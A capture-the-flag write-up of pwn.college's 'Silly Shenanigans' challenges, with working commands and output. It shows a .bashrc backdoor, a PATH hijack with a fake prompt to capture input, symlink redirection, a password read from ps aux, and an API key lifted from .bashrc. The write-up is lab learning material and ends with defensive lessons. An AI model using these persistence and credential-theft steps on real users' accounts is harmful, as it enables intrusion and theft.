# Silly Shenanigans

## Bashrc Backdoor
In this challenge, we'll pretend that you've broken into a victim user's machine! That user is named `zardus`, with a home directory of `/home/zardus.` You, as the hacker user, have write access to his `.bashrc`, and `zardus` has read-access to `/flag`. The victim is simulated by the script `/challenge/victim`, and you can launch this script at any time to observe the victim logging into the computer. Can you get the flag?
### Solve
**Flag:** `pwn.college{coMUMbhY9HDtEI7M1_70HoxyTCs.0VMzEzNxwyNyAzNzEzW}`
- Change dir to `/home/zardus`
- Open `.bashrc` file in write mode.
- add the line `cat /flag` since he has read permissions for that file.
- run the `/challenge/victim` script.
> `.bashrc` contents
```bash
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
cat /flag
```
> Output
```bash
hacker@shenanigans~bashrc-backdoor:~$ cd /home/zardus
hacker@shenanigans~bashrc-backdoor:/home/zardus$ ls
hacker@shenanigans~bashrc-backdoor:/home/zardus$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .profile
hacker@shenanigans~bashrc-backdoor:/home/zardus$ code .bashrc
hacker@shenanigans~bashrc-backdoor:/home/zardus$ /challenge/victim
Username: zardus
Password: *********
pwn.college{coMUMbhY9HDtEI7M1_70HoxyTCs.0VMzEzNxwyNyAzNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
```


## Sniffing Input
Your mission is to use your continued write access to Zardus's `.bashrc` to intercept this flag. Remember how you hijacked commands in the Pondering PATH module? Can you use that capability to hijack the `flag_checker`?

`HINT:` Is Zardus getting spooked by your hijack? He's careful --- he checks for the `flag_checker` prompt of Type the flag. Make sure your hijack also prints this prompt (e.g., echo "Type the flag"). 
### Solve
**Flag:** `pwn.college{wN8DGlwpcbeFjj3YKaeQh-S_THw.0VNzEzNxwyNyAzNzEzW}`
- create a fake `flag_checker` file which takes `stdin` and prints it back to the terminal.
- make it executable.
- in `zardus`' `.bashrc` update the `PATH` variable by adding the path `/home/hacker:` to the start of the the variable. This way files in this path will be checked first. This makes the fake `flag_checker` file run instead of the real one.
> fake `flag_checker` content
```bash
#!/bin/bash

echo "Type the flag, victim: "
read flag
echo
echo "$flag"
```
> zardus' `.bashrc` content
```bash
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
PATH="/home/hacker:$PATH"
```
> output
```
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~sniffing-input:~$ flag_checker
Type the flag, victim: 
*************************************************************
pwn.college{wN8DGlwpcbeFjj3YKaeQh-S_THw.0VNzEzNxwyNyAzNzEzW}
zardus@shenanigans~sniffing-input:~$ exit
logout
```


## Overshared Directories
In this challenge, for convenience, Zardus opened up his home directory:
```
zardus@dojo:~$ chmod a+w /home/zardus
```
As you know, there are lots of sensitive files in that directory such as `.bashrc`! Can you replicate the previous attack with write access to `/home/zardus` instead of `/home/zardus/.bashrc`?
### Solve
**Flag:** `pwn.college{wP4YWOwM_YFwjQYq3UBT92q3uow.0FM0EzNxwyNyAzNzEzW}`
- copy existing content of `/home/zardus/.bashrc`.
- delete the file.
- add the contents to a newly created `.bashrc` file.
- append the lines that updates the `PATH` variable.
```bash
hacker@shenanigans~overshared-directories:~$ code /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ echo "PATH='/home/hacker:$PATH" >> /home/zardus/.bashrc
bash: /home/zardus/.bashrc: Permission denied
hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
rm: remove write-protected regular file '/home/zardus/.bashrc'? y
hacker@shenanigans~overshared-directories:~$ echo "PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '" > /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ echo "PATH='/home/hacker:$PATH'" >> /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag, victim: 
*************************************************************
pwn.college{wP4YWOwM_YFwjQYq3UBT92q3uow.0FM0EzNxwyNyAzNzEzW}
zardus@shenanigans~overshared-directories:~$ exit
logout
```


## Tricky Linking
Zardus has further guarded up. He has started charing `/tmp/collab` folder instead of his `home` directory. Also, he maintains an `evil-commands.txt` file which contains the commands to be weary of. When you run `/challenge/victim` zardus will add the lines `cat /flag` to this `/tmp/collab/evil-commands.txt` file. How can you redirect his write by creating a symbolic link to trick him into revealing the flag.
### Solve
**Flag:** `pwn.college{Yw5dz0MCjdi46pArLPKES6Mj39H.0VM0EzNxwyNyAzNzEzW}`
- remove the `/tmp/collab/evil-commads.txt` file.
- create a symbolic link to `/home/zardus/.bashrc` with the same name.
- run `/challenge/victim` command to the line `cat /flag` gets added to zardus' `.bashrc` file.
- run `/challenge/victim` command again so when zardus executes his commands, it will print out the flag to the terminal.
```bash
hacker@shenanigans~tricky-linking:~$ rm /tmp/collab/evil-commands.txt 
rm: remove write-protected regular file '/tmp/collab/evil-commands.txt'? y
hacker@shenanigans~tricky-linking:~$ ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: ***********
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
hacker@shenanigans~tricky-linking:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{Yw5dz0MCjdi46pArLPKES6Mj39H.0VM0EzNxwyNyAzNzEzW}
zardus@shenanigans~tricky-linking:~$ echo "cat /flag" >> /tmp/collab/evil-commands.txt
zardus@shenanigans~tricky-linking:~$ exit
logout
```


## Sniffing Process Arguments
Zardus is using an automation script, passing his account password to it as an argument. Zardus is also allowed to use `sudo` (and, thus, to `sudo cat /flag`!). Steal the password, log in to Zardus' account and get the flag.
### Solve
**Flag:** `pwn.college{45ADGFGf-1FHBMFKpjdd94AoTZz.0FOzEzNxwyNyAzNzEzW}`
- pipe the output of `ps aux` to a file `ps.txt`
- `grep` to find the keyword `pw` in the above created file.
- copy the password
- switch user to `zardus`
- `cat` the flag using `sudo`
```bash
hacker@shenanigans~sniffing-process-arguments:~$ ps aux > ps.txt
hacker@shenanigans~sniffing-process-arguments:~$ grep "pw" ps.txt
root         147  0.0  0.0   5204  3200 ?        S    08:32   0:00 su -c auto.sh --user zardus --pass pw_2465417715 zardus
zardus       151  0.0  0.0   4132  2560 ?        Ss   08:32   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_2465417715
hacker@shenanigans~sniffing-process-arguments:~$ su zardus
Password: 
zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
pwn.college{45ADGFGf-1FHBMFKpjdd94AoTZz.0FOzEzNxwyNyAzNzEzW}
```


## Snooping on Configurations
In this level, users can use a valid API key to get the flag:
```bash
zardus@dojo:~$ flag_getter --key $FLAG_GETTER_API_KEY
Correct API key! Do you want me to print the key (y/n)? y
pwn.college{HACKED}
zardus@dojo:~$
```
Naturally, Zardus stores his key in `.bashrc`. Can you steal the key and get the flag?
NOTE: When you get the API key, just execute `flag_getter` as the hacker user. This challenge's `/challenge/victim` is just for theming: you don't need to use it.
### Solve
**Flag:** `pwn.college{coizSEYwSIHHCLxuGeQzRrXUxvJ.0lM0EzNxwyNyAzNzEzW}`
- read the `/home/zardus/.bashrc` file.
- search for the keyword `API`.
- copy the key.
- run the specified command and pass the copied key as the argument.
```
hacker@shenanigans~snooping-on-configurations:~$ code /home/zardus/.bashrc
hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-1042020373
Correct API key! Do you want me to print the flag (y/n)?
y
pwn.college{coizSEYwSIHHCLxuGeQzRrXUxvJ.0lM0EzNxwyNyAzNzEzW}

hacker@shenanigans~snooping-on-configurations:~$
```


## New Learnings
- **The `.bashrc` file**
    - The `.bashrc` file, a hidden shell initialization script in a user’s home directory, configures the interactive shell environment at session start. In a cybersecurity context, it is notable both for legitimate customization (aliases, environment variables, and convenience functions) and for abuse: threat actors may modify .bashrc to establish persistence, load covert tooling, or inject environment variables that alter command behavior. Because changes to this file execute automatically for interactive sessions, it is a high-value artifact for both attackers and defenders — requiring careful auditing, strict permissions, and monitoring in secure environments.
- **The directory permissions**
    - The problem is that a subtlety of Linux file/directory permissions is that anyone with *write* access to a directory can *move* and *delete* files in it. 
- **The sticky `t` bit**
    - The sticky bit in Linux is a permission set on directories that allows only the file’s owner (or root) to delete or rename files inside, even if others have write access to the directory. It’s commonly used on shared directories like `/tmp` to prevent users from deleting each other’s files.
- ***Do NOT pass "passwords" as arguments to scripts. They can be seen by the `ps` command.***
